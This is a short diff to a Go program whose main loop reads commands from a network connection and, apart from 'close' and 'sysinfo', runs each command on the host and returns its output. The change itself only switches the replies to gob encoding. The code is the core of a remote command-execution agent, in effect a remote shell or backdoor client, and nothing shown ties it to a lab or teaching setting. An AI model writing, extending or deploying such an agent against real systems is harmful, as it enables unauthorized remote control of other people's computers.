@@ -22,6 +22,7 @@ func main() {
 
 	cmd := ""
 	dec := gob.NewDecoder(conn)
+	enc := gob.NewEncoder(conn)
 
 	for cmd != "close" {
 
@@ -37,7 +38,7 @@ func main() {
 
 		case cmd == "sysinfo":
 			osType := runtime.GOOS
-			fmt.Fprintf(conn, osType)
+			enc.Encode(osType)
 
 		default:
 			out, err := exec.Command(cmd).Output()
@@ -47,7 +48,7 @@ func main() {
 			}
 
 			output := string(out[:])
-			fmt.Fprintf(conn, output)
+			enc.Encode(output)
 		}	
 	}
 	conn.Close()
